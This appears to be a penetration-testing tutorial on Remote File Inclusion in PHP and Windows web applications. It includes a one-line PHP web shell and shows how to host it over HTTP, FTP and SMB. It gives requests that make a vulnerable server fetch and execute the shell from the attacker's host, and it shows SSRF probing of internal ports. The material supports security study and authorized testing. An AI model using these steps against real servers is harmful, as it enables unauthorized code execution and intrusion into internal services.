# Remote File Inclusion (RFI)

## 1. Overview

**Remote File Inclusion (RFI)** is a web application vulnerability that occurs when an application allows a user-controlled input to include files from a remote URL.

If the vulnerable function executes the included file, an attacker may achieve **Remote Code Execution (RCE)**.

### Main Objectives of RFI

1. **Remote Code Execution (RCE):** Execute commands on the target server by including a malicious script.
2. **Internal Service Enumeration (SSRF):** Access internal web applications and services through the vulnerable server.

### RFI vs. LFI

| Feature              | Local File Inclusion (LFI)                     | Remote File Inclusion (RFI)                   |
| -------------------- | ---------------------------------------------- | --------------------------------------------- |
| File source          | Local filesystem                               | Remote server or URL                          |
| Reads local files    | Yes, if permitted                              | May also be possible                          |
| Includes remote URLs | Not necessarily                                | Yes, if supported                             |
| Executes code        | Depends on the vulnerable function and context | Possible when the included file is executed   |
| Common impact        | Sensitive file disclosure, possible RCE        | Possible RCE and internal service enumeration |

**Key point:** An RFI vulnerability may also allow LFI, but an LFI vulnerability does not necessarily allow RFI.

### Why LFI Does Not Always Lead to RFI

* The vulnerable function may not support remote URLs.
* The attacker may control only part of the filename, not the URL scheme (e.g., `http://` or `ftp://`).
* Server configuration may disable remote file inclusion.
* A function may retrieve remote content without executing it.

## 2. Functions That May Be Vulnerable to RFI

The following functions are identified in the source material.

| Language | Function                       | Reads Content | Executes Code | Supports Remote URLs |
| -------- | ------------------------------ | ------------: | ------------: | -------------------: |
| PHP      | `include()` / `include_once()` |           Yes |           Yes |                  Yes |
| PHP      | `file_get_contents()`          |           Yes |            No |                  Yes |
| Java     | `import`                       |           Yes |           Yes |                  Yes |
| .NET     | `@Html.RemotePartial()`        |           Yes |            No |                  Yes |
| .NET     | `include`                      |           Yes |           Yes |                  Yes |

**Important:** The table describes potential capabilities in vulnerable contexts. Actual exploitability depends on the function, framework, configuration, and application behavior.

## 3. Verifying RFI

Remote URL inclusion is commonly disabled by default because it can introduce security risks.

### Step 1: Check PHP Configuration

In PHP, remote URL inclusion requires the `allow_url_include` setting to be enabled for the relevant URL-wrapper use case.

If the PHP configuration is accessible through an existing LFI vulnerability, search for this setting:

```bash
echo 'BASE64_ENCODED_DATA' | base64 -d | grep allow_url_include
```

Example output:

```ini
allow_url_include = On
```

**Note:** This setting alone does not prove that the vulnerable application is exploitable through RFI. The actual function and application behavior must also support remote inclusion.

### Step 2: Test a Local URL

Use a URL pointing to the target server itself to check whether a remote URL can be included.

Example:

```text
http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php
```

### Step 3: Analyze the Response

Check whether:

* The requested page content appears in the vulnerable section.
* The remote page is rendered or executed rather than displayed as plain source code.
* The target makes a request to the specified URL.
* Different internal ports expose additional web applications.

If the included page is executed as PHP, this indicates that the inclusion mechanism may also execute PHP code.

**Caution:** Including the vulnerable page itself can create a recursive inclusion loop and potentially cause denial of service (DoS).

## 4. Remote Code Execution Through RFI

The general process is:

1. Create a script in the language supported by the target application.
2. Host the script on a server accessible to the target.
3. Include the remote script through the vulnerable parameter.
4. Supply input to the script if it accepts parameters.
5. Verify execution through the application response and server logs.

### Create a PHP Web Shell

The following example creates a PHP script that executes commands supplied through a GET parameter:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

The script uses the `cmd` parameter to pass a command to PHP's `system()` function.

**Security note:** This is an intentionally vulnerable web shell. Use it only in an authorized lab or assessment environment.

## 5. RFI Over HTTP

HTTP is one method of hosting a malicious script for remote inclusion.

### Step 1: Start a Python HTTP Server

From the directory containing `shell.php`, run:

```bash
sudo python3 -m http.server <LISTENING_PORT>
```

Example server output:

```text
Serving HTTP on 0.0.0.0 port <LISTENING_PORT>
```

The target must be able to reach the listening port.

### Step 2: Include the Remote Script

Example request:

```text
http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
```

### Step 3: Verify the Result

If successful:

* The target requests `shell.php` from the attacker's HTTP server.
* The included PHP script executes.
* The supplied `id` command may return the identity of the account running the web application.
* The Python HTTP server logs the incoming request.

Example server log:

```text
"GET /shell.php HTTP/1.0" 200 -
```

### Important Considerations

* Common HTTP ports, such as `80` and `443`, may be permitted by outbound firewall rules.
* A firewall or web application firewall (WAF) may block particular requests or URL schemes.
* Inspect incoming requests to determine whether the application modifies the requested filename or appends an extension.

**Troubleshooting tip:** Compare the actual HTTP server logs with the requested path to identify unexpected filename changes.

## 6. RFI Over FTP

FTP can be used when HTTP connections are blocked or the `http://` scheme is filtered.

### Step 1: Start an FTP Server

Install `pyftpdlib` if it is not already available, then run:

```bash
sudo python -m pyftpdlib -p 21
```

This starts an FTP server listening on port `21`.

### Step 2: Include the Script Using FTP

Example request:

```text
http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
```

### Step 3: FTP Authentication

PHP may attempt anonymous FTP authentication by default, depending on the environment and wrapper behavior.

If authentication is required, credentials can be supplied in the URL:

```text
ftp://user:pass@<OUR_IP>/shell.php
```

An example request using this URL format is:

```bash
curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@<OUR_IP>/shell.php&cmd=id'
```

### When FTP Is Useful

* HTTP is blocked by a firewall.
* The application filters the `http://` scheme.
* FTP URL inclusion is supported by the vulnerable function and server configuration.

**Important:** FTP-based inclusion still depends on the target's supported URL wrappers, network connectivity, authentication requirements, and execution behavior.

## 7. RFI Over SMB (Windows Targets)

SMB-based remote inclusion can be useful when the vulnerable application runs on Windows.

Windows supports Universal Naming Convention (UNC) paths, which reference network resources using a format such as:

```text
\\<OUR_IP>\share\shell.php
```

Windows may treat a remote SMB file as a normal filesystem path. This can allow remote file inclusion without relying on PHP's `allow_url_include` setting, depending on the application and runtime.

### Step 1: Start an SMB Server

Using Impacket:

```bash
impacket-smbserver -smb2support share $(pwd)
```

This exposes the current directory as an SMB share named `share`.

The example uses anonymous access by default in the described setup.

### Step 2: Include the Remote Script

Example request:

```text
http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
```

In a URL, backslashes may need to be encoded or escaped according to how the web application parses the parameter.

### Step 3: Verify Execution

If successful:

* The Windows target accesses the remote SMB share.
* The application includes the remote script.
* The supplied command may execute in the web application's security context.
* The response may reveal the account running the application.

Example output:

```text
NT AUTHORITY\IUSR
```

The exact identity depends on the Windows configuration and the account used by the application.

### Important Considerations

* SMB access is often more practical within the same network.
* Outbound SMB connections over the internet may be blocked.
* Windows version, runtime behavior, application permissions, and SMB authentication requirements affect exploitability.
* Use HTTP response headers and other evidence to identify whether the target is running Windows; do not rely on a single indicator alone.

## 8. RFI and SSRF

RFI may also enable Server-Side Request Forgery (SSRF).

### How It Works

The vulnerable application makes requests to URLs supplied through user-controlled input. Because those requests originate from the server, they may reach internal services that are not directly accessible from the attacker's machine.

### Potential Targets

* Localhost services (`127.0.0.1`)
* Internal web applications
* Services on alternate ports, such as `8080`
* Other systems reachable from the target server

### Example

```text
http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:8080/
```

If the target can access the internal service and the application returns its response, this may reveal an otherwise inaccessible web application.

**Key distinction:**

* **RFI with code execution:** The included file is executed by the application.
* **SSRF through URL inclusion:** The server makes a request to another resource, potentially revealing internal services or responses.

A function that retrieves remote content without executing it may still create an SSRF vulnerability.

## 9. Quick Comparison: HTTP vs. FTP vs. SMB

| Feature                 | HTTP                                   | FTP                                                 | SMB                                                     |
| ----------------------- | -------------------------------------- | --------------------------------------------------- | ------------------------------------------------------- |
| URL/path format         | `http://<OUR_IP>/shell.php`            | `ftp://<OUR_IP>/shell.php`                          | `\\<OUR_IP>\share\shell.php`                            |
| Example server          | Python HTTP server                     | `pyftpdlib`                                         | Impacket SMB server                                     |
| Typical use             | Standard remote hosting                | Alternative when HTTP is restricted                 | Particularly relevant to Windows targets                |
| Firewall dependency     | HTTP connectivity required             | FTP connectivity required                           | SMB connectivity required                               |
| PHP `allow_url_include` | Usually relevant for PHP URL inclusion | Usually relevant for PHP URL inclusion              | May be bypassed through Windows filesystem/UNC behavior |
| Main limitation         | Outbound HTTP may be blocked           | FTP support or authentication may prevent inclusion | SMB access may be blocked or unavailable                |
